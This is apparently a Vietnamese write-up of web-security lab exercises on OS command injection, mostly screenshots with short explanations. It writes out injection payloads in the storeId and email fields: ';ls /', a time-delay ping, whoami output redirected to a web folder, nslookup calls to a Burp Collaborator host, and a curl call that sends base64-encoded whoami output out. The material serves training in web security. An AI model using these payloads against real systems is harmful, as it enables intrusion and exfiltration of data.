![image](https://github.com/user-attachments/assets/f3647a6b-4470-4361-8381-669b901462cd)

![image](https://github.com/user-attachments/assets/fe2f550d-63a6-4d65-b41c-1015e258a6cd)

![image](https://github.com/user-attachments/assets/9e2e788e-874d-417d-abdb-4bb60ea97e53)

Chú ý cái storeId là cái giá trị để check, theo phán đoán thì đấy là 1 cái command và tôi dí thêm `;ls /` để thử, nó chạy được:

![image](https://github.com/user-attachments/assets/48e3f930-7f21-45ce-9dba-2a8ae7846d43)

![image](https://github.com/user-attachments/assets/12a2f0d6-01cb-4278-ab88-a2720ddf842c)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/7bc332e2-8594-4107-b02d-b0e055e63748)

![image](https://github.com/user-attachments/assets/84fda74f-0437-4468-b310-48b5738a1cf0)

![image](https://github.com/user-attachments/assets/dfce798b-ff57-4a1d-9747-625e37a6136d)

Dùng cái `||ping+-c+10+127.0.0.1||` là vì nó sẽ gửi 10 gói tin đến localhost, giả sử 1 cái mấy 1 giây thì 10 cái là 10 giây

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/e62149d0-1863-4f51-a44e-8e3f13094a6f)

![image](https://github.com/user-attachments/assets/573f4c67-e465-4ad0-9733-80868158be3f)

![image](https://github.com/user-attachments/assets/ed899058-6149-464d-94c1-332b6896dec6)

`email=abcd%40gmail.com||whoami>/var/www/images/output.txt||` thì như câu trước, nhưng lần này tôi gửi kết quả đến output.txt nằm ở /var/www/images/ vì đề bảo vứt vào đó, giờ tìm cách chui vào trong đó để xem output

![image](https://github.com/user-attachments/assets/ee3adf58-b39d-4bee-a80d-f39f08358c70)

Mở tạm 1 cái ảnh ra, đổi tên filename thành output.txt

![image](https://github.com/user-attachments/assets/a8880aaa-f3ef-44d9-a164-5ecce2762b9f)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/627e520a-ab48-4710-aee0-6defbf4e4ace)

Tôi bật cái Burp Collaborator lên

![image](https://github.com/user-attachments/assets/98c727b7-7c2a-43a6-aed4-b4939f213846)

Dùng payload `email=abcd%40gmail.com||nslookup+gg0m9t5iybjypbomtujqv7fdw42vqlea.oastify.com||` 

![image](https://github.com/user-attachments/assets/0dfdcf4e-3aec-491a-a845-81138d82aba8)

Xong

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/29d22f61-6b6a-4d97-9474-4d8e0aa5ba68)

Tôi dùng `email=abcd%40gmail.com||nslookup+qoiwh3ds6lr8xlww14r03hnn4ea5ywml.oastify.com||` để chắc chắn rằng ở đó command injection

![image](https://github.com/user-attachments/assets/d67549d4-2745-46ec-b2ec-8595eb66526f)

![image](https://github.com/user-attachments/assets/6f991a7c-0fb9-438a-ae65-d49567192099)

Giờ thì chạy whoami, tôi dùng payload `email=abcd%40gmail.com||curl+https://qoiwh3ds6lr8xlww14r03hnn4ea5ywml.oastify.com/?$(whoami+|+base64)||` 

![image](https://github.com/user-attachments/assets/891931d6-160e-42b0-a270-e107686e56e0)

Giải thích kĩ hơn về payload thì tôi dùng curl gửi tạm 1 request tới trong đó có chứa câu lệnh `whoami | base64`, cái `$()` là để cho lệnh thực thi khi và trả lại kết quả khi đang ở trong url, kết quả trả về sẽ được encode sang base64, encode base64 là vì để nhìn url thuận mắt hơn và ngắn gọn, ví dụ nếu dùng ls thì nó có cả dấu cách hoặc xuống dòng trong đấy nữa, tóm lại là nên encode sang base64

![image](https://github.com/user-attachments/assets/b86eea1e-09ae-4b6f-8223-fdc488a038ec)









